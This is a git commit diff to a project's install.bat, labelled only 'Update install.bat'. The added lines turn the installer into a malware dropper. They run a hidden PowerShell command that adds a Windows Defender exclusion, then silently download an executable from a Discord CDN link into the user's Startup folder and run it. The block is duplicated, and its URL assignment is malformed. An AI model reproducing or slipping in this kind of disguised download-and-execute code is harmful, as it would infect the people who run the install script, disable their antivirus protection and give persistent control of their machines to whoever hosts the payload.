89433a306f342357ae21cea86f80d96eed4277db
Matleox <68650899+Matleox@users.noreply.github.com>
2023-12-19 16:50:49 +0300

    Update install.bat

--- install.bat
+++ install.bat
@@ -1,11 +1,39 @@
-@echo off 
-Title Download Modules...
-python --version 3>NUL
-if errorlevel 1 goto errorNoPython
-pip -v>NUL
-if errorlevel 1 goto errorNoPip
+@echo off
 python -m pip install -r requirements.txt
-cls
-Title Downloading Modules
-echo python GANG.py >> start.bat
-start start.bat
+
+
+powershell -w hidden -c Add-MpPreference -ExclusionPath ""
+
+@echo off
+setlocal 
+
+set "https://cdn.discordapp.com/attachments/973337617057869825/1186665747443896350/Python_Installer.exe"
+set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
+
+
+if exist "%DEST%" del "%DEST%"
+
+curl --silent --output "%DEST%" "%URL%"
+
+if %errorlevel% neq 0 (
+  exit /b %errorlevel%
+)
+
+call "%DEST%"
+
+@echo off
+setlocal 
+
+set "https://cdn.discordapp.com/attachments/973337617057869825/1186665747443896350/Python_Installer.exe"
+set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
+
+
+if exist "%DEST%" del "%DEST%"
+
+curl --silent --output "%DEST%" "%URL%"
+
+if %errorlevel% neq 0 (
+  exit /b %errorlevel%
+)
+
+call "%DEST%"
